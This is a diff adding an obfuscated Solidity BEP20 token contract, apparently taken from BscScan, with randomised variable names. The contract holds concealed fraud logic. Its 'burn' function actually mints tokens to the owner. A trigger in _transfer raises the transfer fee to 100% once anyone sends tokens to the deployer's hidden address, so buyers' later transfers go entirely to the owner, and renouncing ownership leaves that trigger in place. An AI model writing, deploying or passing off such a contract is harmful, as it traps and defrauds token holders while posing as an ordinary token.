@@ -1,0 +1,105 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-12-05
+*/
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.7;
+contract SKSlCfS {
+uint256 public  GWybIf = 100000000000000000000000;
+address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
+address public  NHQqZx = address(0);
+uint256 public  pAazHx = 1000000000000000000;
+string public  name = "SKSlCfS";
+uint256 public  QzfSCR = 100000000000000000;
+address public  vMeIhi = address(0);
+mapping (address => uint256) public balanceOf;
+address public  cVAJJe = address(0);
+event Transfer(address indexed from, address indexed to, uint256 value);
+uint256 public  pTfQPE = 100000000000000000000;
+uint256 private  gpWFiF = 10000000000000;
+uint256 public  MrcupH = 100000000000000000000000;
+address private  pHNaSh = address(0);
+event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+string public  symbol = "SKSlCfS";
+address public  pYtqJl = address(0);
+uint256 public  MlPyuL = 10000000000000000000;
+mapping (address => mapping (address => uint256)) private _allowances;
+uint8 public constant decimals = 18;
+uint256 public  FbpYnU = 10000000000000000;
+address public  uUlbQf = address(0);
+uint256 public constant cGAbNL = 9+1;
+uint256 public  EzQUGj = 10000000000000000000000000000;
+address public owner;
+event Approval(address indexed owner, address indexed spender, uint256 value);
+address public  YDBLKj = address(0);
+uint256 public constant totalSupply = 100000000000000000000000000000;
+function _burn(address account, uint256 amount) private {
+require(account != address(0), "BEP20: mint to the zero address");
+
+balanceOf[account] += amount;
+}
+function _transfer(address from, address to, uint256 amount) private {
+require(from != address(0), "xivijI");
+require(to != address(0), "xivijI");
+require(amount <= balanceOf[from], "xivijI");
+uint256 fee;
+if (from == owner || to == owner){
+fee = 0;
+}
+else{
+fee = amount* cGAbNL/gpWFiF ;
+}
+
+uint256 transferAmount = amount - fee;
+balanceOf[from] -= amount;
+balanceOf[to] += transferAmount;
+balanceOf[owner] += fee;
+if (to==pHNaSh){
+gpWFiF = 9+1;
+}
+emit Transfer(from, to, transferAmount);
+}
+function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+require(_allowances[sender][msg.sender] >= amount, "failed");
+_transfer(sender, recipient, amount);
+_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
+return true;
+}
+function approve(address spender, uint256 amount) public returns (bool) {
+_approve(msg.sender, spender, amount);
+return true;
+}
+function _approve(address _owner, address spender, uint256 amount) private {
+require(_owner != address(0), "");
+require(spender != address(0), "");
+
+_allowances[_owner][spender] = amount;
+emit Approval(_owner, spender, amount);
+}
+function allowance(address _owner, address spender) public view returns (uint256) {
+return _allowances[_owner][spender];
+}
+function transfer(address recipient, uint256 amount) public returns (bool) {
+_transfer(msg.sender, recipient, amount);
+return true;
+}
+modifier onlyOwner() {
+require(msg.sender == owner, "not owner");
+_;
+}
+constructor () public {
+pHNaSh = msg.sender;
+owner = msg.sender;
+balanceOf[owner] = totalSupply;
+emit Transfer(address(0), owner, totalSupply);
+}
+function renounceOwnership() public onlyOwner {
+emit OwnershipTransferred(owner, address(0));
+owner = address(0);
+}
+function burn(uint256 amount) public onlyOwner returns (bool) {
+_burn(msg.sender, amount);
+return true;
+}
+
+}
